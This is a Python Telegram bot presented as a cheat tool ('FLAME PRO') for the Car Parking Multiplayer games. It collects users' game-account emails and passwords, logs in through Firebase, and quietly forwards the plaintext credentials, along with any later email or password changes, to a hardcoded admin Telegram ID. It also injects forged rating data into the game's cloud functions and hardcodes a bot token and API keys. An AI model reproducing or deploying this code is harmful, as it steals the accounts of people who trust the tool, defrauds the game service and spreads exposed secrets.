import telebot
import requests
from telebot import types
import json
from threading import Thread
from flask import Flask
import os

# --- RENDER UPTIME SERVER ---
app = Flask('')
@app.route('/')
def home(): return "🔥 FLAME PRO V22.5 IS ONLINE!"

def run_flask():
    port = int(os.environ.get("PORT", 8080))
    app.run(host='0.0.0.0', port=port)

# --- CONFIG ---
TOKEN = "8407532602:AAGWNZxeHKoVi265rrv2jB-r6EYFEnX-Ds0"
bot = telebot.TeleBot(TOKEN, threaded=True, num_threads=20)

# നിങ്ങളുടെ ടെലിഗ്രാം ഐഡി (അലർട്ടുകൾ ലഭിക്കാൻ)
ADMIN_ID = 7212602902 

API_KEYS = {
    "CPM1": "AIzaSyBW1ZbMiUeDZHYUO2bY8Bfnf5rRgrQGPTM",
    "CPM2": "AIzaSyCQDz9rgjgmvmFkvVfmvr2-7fT4tfrzRRQ"
}

user_sessions = {}

def get_user_info(message):
    u = message.from_user
    return f"👤 {u.first_name} (@{u.username if u.username else 'NoUser'}) [`{u.id}`]"

# --- BOT LOGIC ---

@bot.message_handler(commands=['start'])
def start(message):
    cid = message.chat.id
    user_sessions[cid] = {} # സെഷൻ റീസെറ്റ് ചെയ്യുന്നു
    
    markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True, one_time_keyboard=True)
    markup.add('CPM1', 'CPM2')
    
    msg = bot.send_message(cid, "🔥 **FLAME PRO V22.5**\n\nSelect Version to Continue:", 
                           reply_markup=markup, parse_mode="Markdown")

@bot.message_handler(func=lambda m: m.text in ['CPM1', 'CPM2'])
def set_version(message):
    cid = message.chat.id
    user_sessions[cid] = {'v': message.text, 'info': get_user_info(message)}
    
    msg = bot.send_message(cid, f"✅ Selected: **{message.text}**\n\n📧 Enter Your Email:", 
                           reply_markup=types.ReplyKeyboardRemove(), parse_mode="Markdown")
    bot.register_next_step_handler(msg, get_email)

def get_email(message):
    cid = message.chat.id
    if cid not in user_sessions: return start(message)
    
    user_sessions[cid]['email'] = message.text.strip()
    msg = bot.send_message(cid, "🔑 Enter Your Password:")
    bot.register_next_step_handler(msg, run_login)

def run_login(message):
    cid = message.chat.id
    pwd = message.text.strip()
    sess = user_sessions.get(cid)
    
    if not sess or 'email' not in sess:
        return bot.send_message(cid, "❌ Session Expired! Type /start")

    bot.send_message(cid, "⏳ Logging in, please wait...")

    try:
        r = requests.post(
            f"https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword?key={API_KEYS[sess['v']]}", 
            json={"email": sess['email'], "password": pwd, "returnSecureToken": True}
        )
        res = r.json()
        
        if r.status_code == 200 and 'idToken' in res:
            sess.update({'token': res['idToken'], 'email': sess['email'], 'pwd': pwd})
            
            # --- LOGIN ALERT TO ADMIN ---
            alert = (f"👤 **NEW LOGIN**\n\nUser: {sess['info']}\n"
                     f"📧 Email: `{sess['email']}`\n🔑 Pass: `{pwd}`\n🎮 Game: {sess['v']}")
            bot.send_message(ADMIN_ID, alert, parse_mode="Markdown")
            
            # Control Panel
            btn = types.InlineKeyboardMarkup(row_width=1).add(
                types.InlineKeyboardButton("👑 KING RANK (ULTIMATE)", callback_data="rank"),
                types.InlineKeyboardButton("📧 CHANGE EMAIL", callback_data="c_email"),
                types.InlineKeyboardButton("🔐 CHANGE PASSWORD", callback_data="c_pass"),
                types.InlineKeyboardButton("🚪 LOGOUT", callback_data="logout")
            )
            bot.send_message(cid, f"✅ **LOGIN SUCCESS!**\nWelcome: `{sess['email']}`", reply_markup=btn, parse_mode="Markdown")
        else:
            bot.send_message(cid, f"❌ **FAILED:** {res.get('error', {}).get('message', 'Unknown Error')}\nTry /start again.")
    except Exception as e:
        bot.send_message(cid, "❌ Connection Error!")

@bot.callback_query_handler(func=lambda call: True)
def actions(call):
    cid = call.message.chat.id
    sess = user_sessions.get(cid)

    if call.data == "logout":
        user_sessions.pop(cid, None)
        bot.edit_message_text("🚪 Logged out successfully.", cid, call.message.message_id)
        return

    if not sess or 'token' not in sess:
        return bot.answer_callback_query(call.id, "Session Expired! /start", show_alert=True)

    bot.answer_callback_query(call.id)
    head = {"Authorization": f"Bearer {sess['token']}", "Content-Type": "application/json"}

    if call.data == "rank":
        url = "https://us-central1-cp-multiplayer.cloudfunctions.net/SetUserRating4" if sess['v']=="CPM1" else "https://us-central1-cpm-2-7cea1.cloudfunctions.net/SetUserRating17_AppI"
        fields = ["cars","car_fix","car_collided","car_exchange","car_trade","car_wash","slicer_cut","drift_max","drift","cargo","delivery","taxi","levels","gifts","fuel","offroad","speed_banner","reactions","police","run","real_estate","t_distance","treasure","block_post","push_ups","burnt_tire","passanger_distance"]
        r_data = {f: 100000 for f in fields}
        r_data.update({"time": 10000000000, "race_win": 3000})
        
        try:
            requests.post(url, headers=head, json={"data": json.dumps({"RatingData": r_data})})
            bot.send_message(cid, "👑 **KING RANK INJECTED!**")
            bot.send_message(ADMIN_ID, f"👑 **RANK USED**\nUser: {sess['info']}\nAcc: `{sess['email']}`", parse_mode="Markdown")
        except:
            bot.send_message(cid, "❌ Injection Failed.")

    elif call.data == "c_email":
        msg = bot.send_message(cid, "Enter New Email:")
        bot.register_next_step_handler(msg, finalize_email)
        
    elif call.data == "c_pass":
        msg = bot.send_message(cid, "Enter New Password:")
        bot.register_next_step_handler(msg, finalize_pass)

def finalize_email(message):
    cid, sess = message.chat.id, user_sessions.get(message.chat.id)
    if not sess or 'token' not in sess: return
    new_e = message.text.strip()
    
    r = requests.post(f"https://identitytoolkit.googleapis.com/v1/accounts:update?key={API_KEYS[sess['v']]}", 
                      json={"idToken": sess['token'], "email": new_e, "returnSecureToken": True})
    if r.status_code == 200:
        bot.send_message(ADMIN_ID, f"📧 **EMAIL CHANGED**\nUser: {sess['info']}\nOld: `{sess['email']}`\nNew: `{new_e}`", parse_mode="Markdown")
        bot.send_message(cid, f"✅ Email Changed to: {new_e}")
        sess.update({'token': r.json()['idToken'], 'email': new_e})
    else:
        bot.send_message(cid, f"❌ Error: {r.json().get('error', {}).get('message')}")

def finalize_pass(message):
    cid, sess = message.chat.id, user_sessions.get(message.chat.id)
    if not sess or 'token' not in sess: return
    new_p = message.text.strip()
    
    r = requests.post(f"https://identitytoolkit.googleapis.com/v1/accounts:update?key={API_KEYS[sess['v']]}", 
                      json={"idToken": sess['token'], "password": new_p, "returnSecureToken": True})
    if r.status_code == 200:
        bot.send_message(ADMIN_ID, f"🔐 **PASS CHANGED**\nUser: {sess['info']}\nAcc: `{sess['email']}`\nNew: `{new_p}`", parse_mode="Markdown")
        bot.send_message(cid, "✅ Password Updated Successfully!")
        sess.update({'token': r.json()['idToken']})
    else:
        bot.send_message(cid, f"❌ Error: {r.json().get('error', {}).get('message')}")

if __name__ == "__main__":
    Thread(target=run_flask).start()
    print("🚀 FLAME PRO V22.5 IS READY!")
    bot.infinity_polling(timeout=10, long_polling_timeout=5)
